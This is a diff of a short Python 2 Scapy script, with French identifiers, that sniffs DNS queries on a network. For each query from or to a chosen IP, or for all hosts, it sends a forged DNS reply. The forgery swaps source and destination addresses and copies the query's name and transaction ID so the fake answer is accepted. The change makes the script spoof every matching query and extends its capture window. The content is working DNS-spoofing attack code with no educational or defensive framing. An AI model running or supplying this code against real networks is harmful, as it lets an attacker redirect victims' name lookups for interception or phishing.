@@ -18,21 +18,18 @@ def maFonction(a):
     i.inc()
     msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
     if (a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a'):
-        if (a[DNS].qr==0L):
-            msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
-            paquet[IP].src = a[IP].dst
-            paquet[IP].dst = a[IP].src
-            paquet[DNS].an[0].rrname=a[DNS].qd[0].qname
-            paquet[DNS].id=a[DNS].id
-            tosend=Ether()/paquet
-            sendp(tosend)
-        else:
-            msg = msg + ' <-- RESPONSE : ' + a[DNS].an[0].rdata
+        msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
         print msg
+        paquet[IP].src = a[IP].dst
+        paquet[IP].dst = a[IP].src
+        paquet[DNS].an[0].rrname=a[DNS].qd[0].qname
+        paquet[DNS].id=a[DNS].id
+        tosend=Ether()/paquet
+        sendp(tosend)
         
 def monFiltre(x):
-    return (x.haslayer(DNS))
+    return (x.haslayer(DNS)) and (x[DNS].qr==0L)
     
 
 filtre = sys.argv[1]
-a = sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 10)
+sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)
